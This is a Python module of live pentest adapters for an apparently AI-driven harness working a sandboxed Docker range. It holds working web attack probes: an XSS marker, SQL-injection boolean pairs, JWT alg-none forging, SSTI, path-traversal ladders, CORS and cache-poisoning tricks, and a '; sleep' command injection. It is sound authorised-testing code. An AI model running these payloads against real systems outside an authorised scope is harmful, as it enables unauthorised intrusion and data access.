"""Live pentest-tool adapters for the Docker sandbox range (HC-AGENT-01 §5.3).

After the dispatcher passes a request through scope, blast, and rate, it runs an adapter
on the attacker container. Each adapter here wraps one real tool from the attacker image
(`infra/sandbox/Dockerfile.attacker`): it runs the tool via the injected runner against a
pinned in-scope target and returns the raw observable signals the harness triages (never
the agent) into a lead. An adapter holds no engagement secrets, reaches only the attacker
container it was handed, and shells out through the injected runner, so the same code is
unit-tested with no Docker or real tool present. A new capability is a new reviewed
adapter here, never a general exec primitive (§5.3); the baseline HTTP probe lives in
`harness/sandbox/probe.py`.
"""
import base64
import json
import secrets
import time
import urllib.parse
import xml.etree.ElementTree as ET

from harness.sandbox.base import default_run

# Security headers whose absence is itself a lead the client-side and web-auth cards act
# on (clickjacking, weak CSP, missing HSTS, MIME sniffing). Checked on every httpx hit.
_SECURITY_HEADERS = (
    "content-security-policy",
    "x-frame-options",
    "strict-transport-security",
    "x-content-type-options",
)


class _Adapter:
    """Shared base: resolve a pinned target name to the IP the scope guard enforces on,
    and run a command on the attacker container through the injected runner."""

    def __init__(self, attacker, pinned, *, run=None):
        self.attacker = attacker
        self.pinned = pinned
        self._run = run or default_run

    def _resolve(self, target):
        ip = self.pinned.get(target)
        return str(ip) if ip is not None else target

    def _exec(self, *argv, input=None):
        return self._run(["docker", "exec", self.attacker, *argv], input=input)

    def _send_http(self, url, method="GET", headers=None):
        """Issue one HTTP request from the attacker container and return (status, body).
        Shared by the crafted-request, SQL-injection, and authorization adapters; optional
        request headers (e.g. an Authorization bearer token) ride along as a JSON arg."""
        argv = ["python3", "-c", _HTTP_REQUEST, url, method]
        if headers:
            argv.append(json.dumps(headers))
        r = self._exec(*argv)
        return _parse_http_response(r.out or "")

    def _send_http_full(self, url, method="GET", headers=None):
        """Like `_send_http`, but also returns the response headers: (status, headers,
        body). Used where the signal is in a response header (e.g. a CORS allow-origin)."""
        argv = ["python3", "-c", _HTTP_REQUEST_FULL, url, method]
        if headers:
            argv.append(json.dumps(headers))
        r = self._exec(*argv)
        return _parse_http_full(r.out or "")


class NmapAdapter(_Adapter):
    """Service and version detection with `nmap -sV`. Registered as the `nmap` tool.

    Scans only the requested port (the scope guard drops anything else anyway) with
    `-Pn`, since range targets are known-in-scope and container host discovery is
    unreliable. Returns per-port service facts - name, product, version, CPE - which are
    exactly what version-based technique cards match on; `cpe` maps straight to CVE data."""

    # -sV service/version detection; -Pn skip host discovery; -oX - XML on stdout.
    def run(self, req):
        ip = self._resolve(req["target"])
        port = int(req["port"])
        argv = ["nmap", "-sV", "-Pn", "-p", str(port), "--version-intensity", "2",
                "-oX", "-", ip]
        r = self._exec(*argv)
        raw = (r.out or "").encode("utf-8", "replace") if isinstance(r.out, str) else (r.out or b"")
        services = _parse_nmap_services(r.out or "")
        hit = bool(services)
        primary = services[0] if services else {}
        return {
            "status": "ok" if hit else "error",
            "parsed": {"services": services},
            "request_bytes": (" ".join(argv)).encode("utf-8"),
            "response_bytes": raw,
            "deterministic_signals": {
                "hit": hit,
                "open_ports": [s["port"] for s in services],
                "service": primary.get("name"),
                "product": primary.get("product"),
                "version": primary.get("version"),
                "cpe": primary.get("cpe"),
                "confidence": 0.95 if hit else 0.0,
                "services": services,
            },
        }


class HttpxAdapter(_Adapter):
    """Web recon and fingerprinting with ProjectDiscovery `httpx`. Registered as `httpx`.

    Issues one request to a pinned in-scope web target and returns what makes the
    web-protocol-auth and client-side cards applicable: the status, title, the server and
    technology fingerprint, the response headers, which security headers are missing, any
    CORS allow-origin, and any redirect target. It does not follow redirects, since a
    redirect can leave the asset, so the Location is reported for a card to reason about
    rather than chased; the scope guard would drop an out-of-scope hop regardless."""

    def run(self, req):
        ip = self._resolve(req["target"])
        port = int(req["port"])
        args = req.get("args") or {}
        scheme = args.get("scheme") or ("https" if port in (443, 8443) else "http")
        path = args.get("path", "/")
        url = f"{scheme}://{ip}:{port}{path}"
        argv = ["httpx", "-u", url, "-json", "-silent", "-sc", "-title", "-server",
                "-td", "-cl", "-location", "-include-response-header", "-no-color",
                "-timeout", "10"]
        r = self._exec(*argv)
        raw = (r.out or "").encode("utf-8", "replace") if isinstance(r.out, str) else (r.out or b"")
        obj = _parse_httpx(r.out or "")
        # httpx normalizes header names to lowercase with underscores; map back to the
        # canonical hyphenated names the cards and this module reason about.
        headers = {k.replace("_", "-").lower(): v for k, v in (obj.get("header") or {}).items()}
        status_code = int(obj.get("status_code") or 0)
        hit = bool(obj) and not obj.get("failed", False) and status_code > 0
        missing = [h for h in _SECURITY_HEADERS if h not in headers] if hit else []
        return {
            "status": "ok" if hit else "error",
            "parsed": {"http": obj},
            "request_bytes": (" ".join(argv)).encode("utf-8"),
            "response_bytes": raw,
            "deterministic_signals": {
                "hit": hit,
                "status_code": status_code,
                "title": obj.get("title"),
                "webserver": obj.get("webserver"),
                "tech": obj.get("tech") or [],
                "content_type": obj.get("content_type"),
                "location": obj.get("location"),
                "headers": headers,
                "missing_security_headers": missing,
                "cors_allow_origin": headers.get("access-control-allow-origin"),
                "confidence": 0.9 if hit else 0.0,
            },
        }


def _parse_httpx(out_text):
    """Parse httpx `-json` output (one JSON object per line) into the probed URL's result
    dict. Tolerant: returns {} on no output or unparseable lines, so the adapter reports
    no hit rather than raising."""
    obj = {}
    for line in (out_text or "").splitlines():
        line = line.strip()
        if not line or not line.startswith("{"):
            continue
        try:
            cand = json.loads(line)
        except (ValueError, TypeError):
            continue
        if isinstance(cand, dict) and ("status_code" in cand or "url" in cand):
            obj = cand
    return obj


# Issued inside the attacker container; stdlib only. Prints the status line, a sentinel,
# then the raw body, so the adapter reads both back from one exec.
_HTTP_REQUEST = (
    "import sys,json,urllib.request,urllib.error\n"
    "url,method=sys.argv[1],sys.argv[2]\n"
    "hdrs=json.loads(sys.argv[3]) if len(sys.argv)>3 else {}\n"
    "req=urllib.request.Request(url,method=method,headers=hdrs)\n"
    "try:\n"
    "    r=urllib.request.urlopen(req,timeout=8); code=r.status; body=r.read(65536)\n"
    "except urllib.error.HTTPError as e:\n"
    "    code=e.code; body=e.read(65536)\n"
    "except Exception as e:\n"
    "    print('ERR',type(e).__name__); sys.exit(0)\n"
    "sys.stdout.write('STATUS %d\\n---BODY---\\n'%code); sys.stdout.flush()\n"
    "sys.stdout.buffer.write(body)\n"
)


# Like _HTTP_REQUEST, but emits the response headers as a JSON line before the body, so
# an adapter can read a signal that lives in a header.
_HTTP_REQUEST_FULL = (
    "import sys,json,urllib.request,urllib.error\n"
    "url,method=sys.argv[1],sys.argv[2]\n"
    "hdrs=json.loads(sys.argv[3]) if len(sys.argv)>3 else {}\n"
    "req=urllib.request.Request(url,method=method,headers=hdrs)\n"
    "try:\n"
    "    r=urllib.request.urlopen(req,timeout=8); code=r.status; rh=dict(r.headers); body=r.read(65536)\n"
    "except urllib.error.HTTPError as e:\n"
    "    code=e.code; rh=dict(e.headers); body=e.read(65536)\n"
    "except Exception as e:\n"
    "    print('ERR',type(e).__name__); sys.exit(0)\n"
    "sys.stdout.write('STATUS %d\\n'%code + json.dumps(rh) + '\\n---BODY---\\n'); sys.stdout.flush()\n"
    "sys.stdout.buffer.write(body)\n"
)


def _parse_http_full(out_text):
    """Split the full in-container request output into (status_code, headers, body).
    Tolerant: returns (0, {}, "") when the request errored or printed nothing usable."""
    text = out_text or ""
    if not text.startswith("STATUS"):
        return 0, {}, ""
    head, _, body = text.partition("\n---BODY---\n")
    status_line, _, hdr_json = head.partition("\n")
    parts = status_line.split()
    code = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
    try:
        headers = json.loads(hdr_json) if hdr_json else {}
    except (ValueError, TypeError):
        headers = {}
    return code, headers, body


class HttpRequestAdapter(_Adapter):
    """Crafted HTTP requests against a pinned in-scope web target. Registered as `http`.

    This is the request primitive the web-protocol-auth and client-side cards drive: it
    sends one request the card parametrizes (method, path, query parameters) and returns
    the status, the body, and the round-trip time the card's success signal reads. When
    `reflect_param` names a query parameter, the adapter injects a random, tag-breaking
    marker into it and reports whether that exact marker reflects unencoded in the
    response body - a deterministic reflected-XSS signal the harness owns, not the model.
    The marker is generated here, so a model cannot pre-pick one that always matches, and
    a server that encodes its output will not echo the raw marker back."""

    def run(self, req):
        ip = self._resolve(req["target"])
        port = int(req["port"])
        args = req.get("args") or {}
        method = (args.get("method") or "GET").upper()
        scheme = args.get("scheme") or ("https" if port in (443, 8443) else "http")
        path = args.get("path", "/")
        params = dict(args.get("params") or {})
        reflect_param = args.get("reflect_param")
        marker = ""
        if reflect_param:
            marker = '"><svg/onload=alert(1)>hcx' + secrets.token_hex(6)
            params[reflect_param] = marker
        qs = urllib.parse.urlencode(params)
        url = f"{scheme}://{ip}:{port}{path}" + (f"?{qs}" if qs else "")
        t0 = time.monotonic()
        status_code, body = self._send_http(url, method)
        elapsed_ms = int((time.monotonic() - t0) * 1000)
        reflected = bool(marker) and marker in body
        hit = reflected if reflect_param else status_code > 0
        return {
            "status": "ok" if hit else "error",
            "parsed": {"status_code": status_code, "body_len": len(body)},
            "request_bytes": f"{method} {url}".encode("utf-8"),
            "response_bytes": f"STATUS {status_code}\n{body}".encode("utf-8", "replace"),
            "deterministic_signals": {
                "hit": hit,
                "status_code": status_code,
                "reflected": reflected,
                "marker": marker or None,
                "elapsed_ms": elapsed_ms,
                "body_len": len(body),
                "confidence": 0.95 if reflected else (0.5 if hit else 0.0),
            },
        }


def _parse_http_response(out_text):
    """Split the in-container request output into (status_code, body). Tolerant: returns
    (0, "") when the request errored or printed nothing the adapter recognizes."""
    text = out_text or ""
    if not text.startswith("STATUS"):
        return 0, ""
    first, _, rest = text.partition("\n")
    parts = first.split()
    code = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
    body = rest.split("---BODY---\n", 1)[1] if "---BODY---\n" in rest else ""
    return code, body


# SQL boolean conditions the harness appends to prove injection: a true one the server
# must answer the same as the baseline, and a false one it must answer differently. The
# numeric pair suits an unquoted column; the string pair closes a quoted one.
_SQLI_TEMPLATES = (
    ("numeric", " AND 1=1", " AND 1=2"),
    ("string", "' AND '1'='1", "' AND '1'='2"),
)


class SqliAdapter(_Adapter):
    """Boolean-blind SQL injection detection against a pinned in-scope web target.
    Registered as `sqli`.

    For the named parameter the harness sends three requests - the baseline value, the
    value with an appended condition that is always true, and one that is always false -
    and reports injection only when the true condition reproduces the baseline response
    while the false one changes it. The conditions are generated here, not by the model,
    so a model cannot force the verdict; a parameter the query parametrizes safely treats
    all three as literal data, so its responses never split that way. The signal is
    deterministic and harness-owned, and the Verifier reruns the same differential, so a
    confirm is two independent splits."""

    def run(self, req):
        ip = self._resolve(req["target"])
        port = int(req["port"])
        args = req.get("args") or {}
        scheme = args.get("scheme") or ("https" if port in (443, 8443) else "http")
        path = args.get("path", "/")
        params = dict(args.get("params") or {})
        sqli_param = args.get("sqli_param")
        base = str(params.get(sqli_param, "1")) if sqli_param else "1"

        def fetch(value):
            p = dict(params)
            if sqli_param:
                p[sqli_param] = value
            qs = urllib.parse.urlencode(p)
            url = f"{scheme}://{ip}:{port}{path}" + (f"?{qs}" if qs else "")
            return url, self._send_http(url)

        base_url, base_resp = fetch(base)
        base_status = base_resp[0]
        technique = None
        probes = [{"label": "baseline", "value": base, "status": base_status,
                   "len": len(base_resp[1])}]
        if sqli_param and base_status > 0:
            for name, t_suffix, f_suffix in _SQLI_TEMPLATES:
                _, t_resp = fetch(base + t_suffix)
                _, f_resp = fetch(base + f_suffix)
                probes.append({"label": name + ":true", "status": t_resp[0], "len": len(t_resp[1])})
                probes.append({"label": name + ":false", "status": f_resp[0], "len": len(f_resp[1])})
                if t_resp == base_resp and f_resp != base_resp:
                    technique = name
                    break
        hit = technique is not None
        return {
            "status": "ok" if hit else "error",
            "parsed": {"technique": technique, "probes": probes},
            "request_bytes": f"sqli {base_url} param={sqli_param}".encode("utf-8"),
            "response_bytes": repr(probes).encode("utf-8"),
            "deterministic_signals": {
                "hit": hit,
                "sqli": hit,
                "technique": technique,
                "status_code": base_status,
                "confidence": 0.95 if hit else 0.0,
            },
        }


class IdorAdapter(_Adapter):
    """Broken object-level authorization (IDOR / BOLA) against a pinned in-scope target.
    Registered as `idor`.

    The harness authenticates as one identity, then requests that identity's own object
    and a neighbouring object it should not own, both with the same token. It reports a
    broken access control only when the neighbour's object comes back 200 with distinct
    data, which an app that checks ownership would refuse with a 401 or 403. The identity
    and the neighbour id are chosen by the harness and the Verifier repeats the pair, so
    the verdict is deterministic and harness-owned, not the model's judgement."""

    def run(self, req):
        ip = self._resolve(req["target"])
        port = int(req["port"])
        args = req.get("args") or {}
        scheme = args.get("scheme") or ("https" if port in (443, 8443) else "http")
        path = args.get("path", "/account")
        id_param = args.get("id_param", "id")
        login_path = args.get("login_path", "/login")
        own_id = str(args.get("own_id", "1"))
        other_id = str(args.get("other_id") or (int(own_id) + 1))

        def get(p, params, headers=None):
            qs = urllib.parse.urlencode(params)
            url = f"{scheme}://{ip}:{port}{p}" + (f"?{qs}" if qs else "")
            return url, self._send_http(url, "GET", headers)

        _, (login_status, token) = get(login_path, {"user": own_id})
        token = (token or "").strip()
        authenticated = login_status == 200 and token.count(".") == 2
        hdr = {"Authorization": f"Bearer {token}"} if authenticated else {}
        own_url, (s_own, b_own) = get(path, {id_param: own_id}, hdr)
        _, (s_other, b_other) = get(path, {id_param: other_id}, hdr)
        hit = (authenticated and s_own == 200 and s_other == 200
               and b_other.strip() != "" and b_other != b_own)
        return {
            "status": "ok" if hit else "error",
            "parsed": {"own_id": own_id, "other_id": other_id,
                       "own_status": s_own, "other_status": s_other},
            "request_bytes": f"idor {own_url} as user {own_id} reading {other_id}".encode("utf-8"),
            "response_bytes": f"own[{s_own}]={b_own}\nother[{s_other}]={b_other}".encode("utf-8", "replace"),
            "deterministic_signals": {
                "hit": hit,
                "idor": hit,
                "authenticated": authenticated,
                "own_status": s_own,
                "other_status": s_other,
                "other_id": other_id,
                "confidence": 0.95 if hit else 0.0,
            },
        }


class BflaAdapter(_Adapter):
    """Broken function-level authorization against a pinned in-scope target. Registered
    as `bfla`.

    The harness calls a privileged function first with no token and then with a token for
    an ordinary, non-privileged user, and reports broken function-level authorization only
    when the function refuses the anonymous call (401 or 403) yet executes for the ordinary
    user (200). The function is gated on being logged in but not on holding the role, which
    is the flaw; a public endpoint that answers the anonymous call too is not reported. The
    identity is the harness's and the Verifier repeats the pair, so the verdict is
    deterministic and harness-owned."""

    def run(self, req):
        ip = self._resolve(req["target"])
        port = int(req["port"])
        args = req.get("args") or {}
        scheme = args.get("scheme") or ("https" if port in (443, 8443) else "http")
        path = args.get("path", "/admin")
        login_path = args.get("login_path", "/login")
        login_user = str(args.get("login_user", "1"))

        def get(p, params=None, headers=None):
            qs = urllib.parse.urlencode(params or {})
            url = f"{scheme}://{ip}:{port}{p}" + (f"?{qs}" if qs else "")
            return url, self._send_http(url, "GET", headers)

        priv_url, (s_anon, _) = get(path)                       # no token: must be refused
        _, (login_status, token) = get(login_path, {"user": login_user})
        token = (token or "").strip()
        authenticated = login_status == 200 and token.count(".") == 2
        hdr = {"Authorization": f"Bearer {token}"} if authenticated else {}
        _, (s_user, b_user) = get(path, None, hdr)              # ordinary user's token
        hit = (authenticated and s_anon in (401, 403)
               and s_user == 200 and b_user.strip() != "")
        return {
            "status": "ok" if hit else "error",
            "parsed": {"anon_status": s_anon, "user_status": s_user},
            "request_bytes": f"bfla {priv_url} as user {login_user}".encode("utf-8"),
            "response_bytes": f"anon[{s_anon}] user[{s_user}]={b_user}".encode("utf-8", "replace"),
            "deterministic_signals": {
                "hit": hit,
                "bfla": hit,
                "authenticated": authenticated,
                "anon_status": s_anon,
                "user_status": s_user,
                "confidence": 0.95 if hit else 0.0,
            },
        }


def _b64u(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _forge_jwt(claims, *, alg):
    """Forge a JWT the harness never had the key to sign. With alg "none" the signature
    is empty (the algorithm-confusion attack); with "HS256" it carries a bogus signature
    that no correct verifier accepts (the control that proves the server honors "none"
    specifically, rather than ignoring the signature on everything)."""
    head = _b64u(json.dumps({"alg": alg, "typ": "JWT"}).encode())
    payload = _b64u(json.dumps(claims).encode())
    sig = "" if alg == "none" else _b64u(b"not-a-valid-signature")
    return f"{head}.{payload}.{sig}"


class JwtAdapter(_Adapter):
    """JWT algorithm-confusion detection against a pinned in-scope target. Registered as
    `jwt`.

    The harness forges two tokens it could not legitimately sign and presents each to a
    protected endpoint: one with alg "none" (no signature) carrying claims it chose, and
    one with a bogus HS256 signature. It reports the flaw only when the unsigned token is
    accepted (200) while the bogus-signature token is refused (401 or 403), which proves
    the server honors alg "none" rather than skipping verification on every token. Both
    tokens are forged in the adapter, so the signal is deterministic and harness-owned,
    and the Verifier forges its own pair to reproduce it."""

    def run(self, req):
        ip = self._resolve(req["target"])
        port = int(req["port"])
        args = req.get("args") or {}
        scheme = args.get("scheme") or ("https" if port in (443, 8443) else "http")
        path = args.get("path", "/account")
        params = dict(args.get("params") or {})
        claims = args.get("claims") or {"sub": "1", "role": "admin"}

        def present(token):
            qs = urllib.parse.urlencode(params)
            url = f"{scheme}://{ip}:{port}{path}" + (f"?{qs}" if qs else "")
            return url, self._send_http(url, "GET", {"Authorization": f"Bearer {token}"})

        forged_none = _forge_jwt(claims, alg="none")
        forged_bad = _forge_jwt(claims, alg="HS256")
        url, (s_none, _) = present(forged_none)
        _, (s_bad, _) = present(forged_bad)
        hit = s_none == 200 and s_bad in (401, 403)
        return {
            "status": "ok" if hit else "error",
            "parsed": {"alg_none_status": s_none, "bad_sig_status": s_bad},
            "request_bytes": f"jwt {url} alg=none forged".encode("utf-8"),
            "response_bytes": f"alg_none[{s_none}] bad_sig[{s_bad}]".encode("utf-8"),
            "deterministic_signals": {
                "hit": hit,
                "jwt_alg_confusion": hit,
                "alg_none_status": s_none,
                "bad_sig_status": s_bad,
                "confidence": 0.95 if hit else 0.0,
            },
        }


class SstiAdapter(_Adapter):
    """Server-side template injection detection against a pinned in-scope target.
    Registered as `ssti`.

    The harness injects a fixed arithmetic template expression into a parameter and reports
    injection only when the response carries the computed value and not the raw expression,
    which proves the template engine evaluated harness-supplied input rather than merely
    reflecting it. The expression is fixed in the adapter, so the signal is deterministic
    and harness-owned, and the Verifier reruns it."""

    _EXPR, _RESULT = "{{7*7}}", "49"

    def run(self, req):
        ip = self._resolve(req["target"])
        port = int(req["port"])
        args = req.get("args") or {}
        scheme = args.get("scheme") or ("https" if port in (443, 8443) else "http")
        path = args.get("path", "/")
        param = args.get("param", "q")
        qs = urllib.parse.urlencode({param: self._EXPR})
        url = f"{scheme}://{ip}:{port}{path}?{qs}"
        status_code, body = self._send_http(url)
        evaluated = self._RESULT in body and self._EXPR not in body
        return {
            "status": "ok" if evaluated else "error",
            "parsed": {"status_code": status_code},
            "request_bytes": f"ssti {url}".encode("utf-8"),
            "response_bytes": f"STATUS {status_code}\n{body}".encode("utf-8", "replace"),
            "deterministic_signals": {
                "hit": evaluated,
                "ssti": evaluated,
                "status_code": status_code,
                "expression": self._EXPR,
                "confidence": 0.95 if evaluated else 0.0,
            },
        }


class CorsAdapter(_Adapter):
    """CORS misconfiguration detection against a pinned in-scope target. Registered as
    `cors`.

    The harness sends a crafted attacker Origin and reports the flaw only when the response
    reflects that exact origin in Access-Control-Allow-Origin and allows credentials, the
    pair that lets a malicious site read an authenticated response. The origin is chosen by
    the harness, so a server that echoes only a trusted origin, or that does not allow
    credentials, does not fire; the Verifier repeats it."""

    _ORIGIN = "https://evil.hc-probe.test"

    def run(self, req):
        ip = self._resolve(req["target"])
        port = int(req["port"])
        args = req.get("args") or {}
        scheme = args.get("scheme") or ("https" if port in (443, 8443) else "http")
        path = args.get("path", "/")
        url = f"{scheme}://{ip}:{port}{path}"
        status_code, headers, _ = self._send_http_full(url, "GET", {"Origin": self._ORIGIN})
        low = {k.lower(): v for k, v in (headers or {}).items()}
        reflects = low.get("access-control-allow-origin") == self._ORIGIN
        credentials = (low.get("access-control-allow-credentials") or "").lower() == "true"
        hit = reflects and credentials
        return {
            "status": "ok" if hit else "error",
            "parsed": {"status_code": status_code,
                       "allow_origin": low.get("access-control-allow-origin")},
            "request_bytes": f"cors {url} Origin={self._ORIGIN}".encode("utf-8"),
            "response_bytes": json.dumps(low).encode("utf-8"),
            "deterministic_signals": {
                "hit": hit,
                "cors": hit,
                "reflects_origin": reflects,
                "allows_credentials": credentials,
                "status_code": status_code,
                "confidence": 0.9 if hit else 0.0,
            },
        }


# The range canary marker the deliberately-vulnerable target writes outside its public
# download dir (infra/sandbox/vulnweb.py). A path-traversal response that carries this
# exact sentinel proves the read escaped the public dir and reached a file on disk; the
# marker is never sent in the request, so a server that stays inside its dir never echoes
# it, and a model cannot force it. Both halves are harness code, so the value is shared.
_RANGE_CANARY = "HC-RANGE-CANARY-d41d8cd98f00b204"


class PathAdapter(_Adapter):
    """Path traversal / local file read against a pinned in-scope target. Registered as
    `path`.

    The harness requests the named file parameter with a traversal ladder that walks out
    of the app's public directory toward the range canary file, and reports a read only
    when the response carries the canary marker, which proves the path escaped the public
    directory and read a file off disk rather than serving an in-directory file. The
    marker is the harness's and never travels in the request, so an app that contains the
    path never echoes it; the Verifier repeats the ladder."""

    # Walk out of the public dir toward /tmp/hc_canary.txt from a few plausible depths.
    _LADDER = ("../hc_canary.txt", "../../tmp/hc_canary.txt", "../../../tmp/hc_canary.txt")

    def run(self, req):
        ip = self._resolve(req["target"])
        port = int(req["port"])
        args = req.get("args") or {}
        scheme = args.get("scheme") or ("https" if port in (443, 8443) else "http")
        path = args.get("path", "/download")
        param = args.get("param", "file")
        attempts = []
        read = False
        last_status = 0
        for payload in self._LADDER:
            qs = urllib.parse.urlencode({param: payload})
            url = f"{scheme}://{ip}:{port}{path}?{qs}"
            status_code, body = self._send_http(url)
            last_status = status_code
            attempts.append({"payload": payload, "status": status_code})
            if _RANGE_CANARY in body:
                read = True
                break
        return {
            "status": "ok" if read else "error",
            "parsed": {"attempts": attempts, "canary_read": read},
            "request_bytes": f"path {path}?{param}=../ ladder".encode("utf-8"),
            "response_bytes": repr(attempts).encode("utf-8"),
            "deterministic_signals": {
                "hit": read,
                "path_traversal": read,
                "file_read": read,
                "status_code": last_status,
                "confidence": 0.95 if read else 0.0,
            },
        }


def _cookie_sid(headers):
    """The `sid` value a Set-Cookie response header carries, or None. Tolerant of the
    header's attributes (Path, HttpOnly, ...) and of case in the header name."""
    for key, val in (headers or {}).items():
        if key.lower() == "set-cookie":
            for part in str(val).split(";"):
                name, _, value = part.strip().partition("=")
                if name == "sid":
                    return value
    return None


class SessAdapter(_Adapter):
    """Session fixation against a pinned in-scope login endpoint. Registered as `sess`.

    The harness obtains a pre-auth session id, authenticates reusing that exact id, and
    reports session fixation only when the login does not rotate the id (issues no fresh
    one) and the pre-auth id is authenticated afterward, which is the condition that lets an
    attacker fix an id onto a victim and inherit their session. The id is the one the server
    issued and the harness drives the cookie lifecycle itself, so a model cannot forge the
    verdict; an app that rotates the id on login leaves the pre-auth id anonymous and does
    not fire. The Verifier repeats the sequence against a fresh snapshot."""

    def run(self, req):
        ip = self._resolve(req["target"])
        port = int(req["port"])
        args = req.get("args") or {}
        scheme = args.get("scheme") or ("https" if port in (443, 8443) else "http")
        base = f"{scheme}://{ip}:{port}"
        path = args.get("path", "/portal")
        login_path = args.get("login_path", "/portal/login")
        me_path = args.get("me_path", "/portal/me")
        login_user = str(args.get("login_user", "1"))

        _, h0, _ = self._send_http_full(base + path)             # establish a pre-auth session
        pre_sid = _cookie_sid(h0)
        rotated = authed = False
        s_login = s_me = 0
        if pre_sid:
            cookie = {"Cookie": f"sid={pre_sid}"}
            qs = urllib.parse.urlencode({"user": login_user})
            s_login, h1, _ = self._send_http_full(f"{base}{login_path}?{qs}", "GET", cookie)
            new_sid = _cookie_sid(h1)
            rotated = new_sid is not None and new_sid != pre_sid  # login issued a fresh id
            s_me, _, b_me = self._send_http_full(f"{base}{me_path}", "GET", cookie)
            authed = s_me == 200 and login_user in b_me and "anonymous" not in b_me.lower()
        hit = bool(pre_sid) and authed and not rotated
        return {
            "status": "ok" if hit else "error",
            "parsed": {"pre_sid_present": bool(pre_sid), "rotated": rotated,
                       "authenticated_after_login": authed},
            "request_bytes": f"sess {base}{login_path} reusing pre-auth sid".encode("utf-8"),
            "response_bytes": f"login[{s_login}] me[{s_me}] rotated={rotated}".encode("utf-8"),
            "deterministic_signals": {
                "hit": hit,
                "session_fixation": hit,
                "pre_auth_id_authenticated": authed,
                "rotated_on_login": rotated,
                "status_code": s_me,
                "confidence": 0.95 if hit else 0.0,
            },
        }


class CacheAdapter(_Adapter):
    """Web cache poisoning via unkeyed input against a pinned in-scope target. Registered
    as `cache`.

    The harness sends a cache-busting request that injects a random marker through an
    unkeyed header (X-Forwarded-Host), then a second, clean request for the same URL, and
    reports poisoning only when the clean request is served the injected marker, which
    proves the marker was cached under a key that ignored the header and handed to a victim
    who never sent it. The marker is the harness's and travels only in the first request's
    header, so a cache that keys on the header (or does not reflect it) never serves it on
    the clean request; the Verifier repeats the pair against a fresh snapshot."""

    _HEADER = "X-Forwarded-Host"

    def run(self, req):
        ip = self._resolve(req["target"])
        port = int(req["port"])
        args = req.get("args") or {}
        scheme = args.get("scheme") or ("https" if port in (443, 8443) else "http")
        path = args.get("path", "/promo")
        buster = "hccb" + secrets.token_hex(4)                # our own cache key: first hit is a miss
        marker = "evil-" + secrets.token_hex(6) + ".hc-probe.test"
        qs = urllib.parse.urlencode({"cb": buster})
        url = f"{scheme}://{ip}:{port}{path}?{qs}"
        s_poison, b_poison = self._send_http(url, "GET", {self._HEADER: marker})
        reflected = marker in b_poison                        # the miss reflected our header
        s_clean, b_clean = self._send_http(url, "GET")        # a victim's clean request
        served_from_cache = marker in b_clean
        hit = reflected and served_from_cache
        return {
            "status": "ok" if hit else "error",
            "parsed": {"poison_status": s_poison, "clean_status": s_clean,
                       "reflected": reflected, "served_from_cache": served_from_cache},
            "request_bytes": f"cache {url} unkeyed {self._HEADER}".encode("utf-8"),
            "response_bytes": f"poison[{s_poison}] clean[{s_clean}] cached={served_from_cache}".encode("utf-8"),
            "deterministic_signals": {
                "hit": hit,
                "cache_poison": hit,
                "reflected": reflected,
                "served_from_cache": served_from_cache,
                "status_code": s_clean,
                "confidence": 0.9 if hit else 0.0,
            },
        }


class CmdiAdapter(_Adapter):
    """OS command injection via a timing oracle against a pinned in-scope target.
    Registered as `cmdi`.

    The harness sends a baseline request and then one that appends a shell `sleep` to the
    parameter, and reports command injection only when the injected request takes at least
    the sleep duration longer than the baseline, which proves the server executed the
    injected command rather than treating it as data. The delay is the harness's and it
    measures the round-trip itself, so a model cannot forge the verdict; a server that does
    not shell out answers both in the same time and does not fire. The Verifier reruns the
    pair against a fresh snapshot. The round-trip clock is injected so the timing logic is
    unit-tested without real sleeps; the live path measures the real wall clock."""

    def __init__(self, attacker, pinned, *, run=None, clock=time.monotonic):
        super().__init__(attacker, pinned, run=run)
        self._clock = clock

    def run(self, req):
        ip = self._resolve(req["target"])
        port = int(req["port"])
        args = req.get("args") or {}
        scheme = args.get("scheme") or ("https" if port in (443, 8443) else "http")
        path = args.get("path", "/ping")
        param = args.get("param", "host")
        base = str(args.get("base", "127.0.0.1"))
        delay_s = float(args.get("delay_s", 5))

        def timed(value):
            qs = urllib.parse.urlencode({param: value})
            url = f"{scheme}://{ip}:{port}{path}?{qs}"
            t0 = self._clock()
            status_code, _ = self._send_http(url)
            return status_code, self._clock() - t0

        base_status, base_elapsed = timed(base)
        inj_status, inj_elapsed = timed(f"{base}; sleep {int(delay_s)}")
        delta = inj_elapsed - base_elapsed
        hit = base_status > 0 and delta >= delay_s * 0.5          # injected sleep dominates
        return {
            "status": "ok" if hit else "error",
            "parsed": {"baseline_ms": int(base_elapsed * 1000),
                       "injected_ms": int(inj_elapsed * 1000)},
            "request_bytes": f"cmdi {path}?{param}=...; sleep {int(delay_s)}".encode("utf-8"),
            "response_bytes": f"baseline={base_elapsed:.3f}s injected={inj_elapsed:.3f}s".encode("utf-8"),
            "deterministic_signals": {
                "hit": hit,
                "cmdi": hit,
                "delay_s": delay_s,
                "baseline_ms": int(base_elapsed * 1000),
                "injected_ms": int(inj_elapsed * 1000),
                "delta_ms": int(delta * 1000),
                "status_code": base_status,
                "confidence": 0.9 if hit else 0.0,
            },
        }


def _parse_nmap_services(xml_text):
    """Parse nmap `-oX -` output into a list of open-port service dicts. Tolerant: any
    parse failure or no open port yields an empty list (the adapter reports no hit)."""
    text = (xml_text or "").strip()
    if not text:
        return []
    try:
        root = ET.fromstring(text)
    except ET.ParseError:
        return []
    out = []
    for port in root.iter("port"):
        state = port.find("state")
        if state is None or state.get("state") != "open":
            continue
        svc = port.find("service")
        svc = svc if svc is not None else ET.Element("service")
        cpe = svc.find("cpe")
        try:
            portid = int(port.get("portid"))
        except (TypeError, ValueError):
            continue
        out.append({
            "port": portid,
            "name": svc.get("name"),
            "product": svc.get("product"),
            "version": svc.get("version"),
            "extrainfo": svc.get("extrainfo"),
            "cpe": cpe.text if cpe is not None else None,
        })
    return out
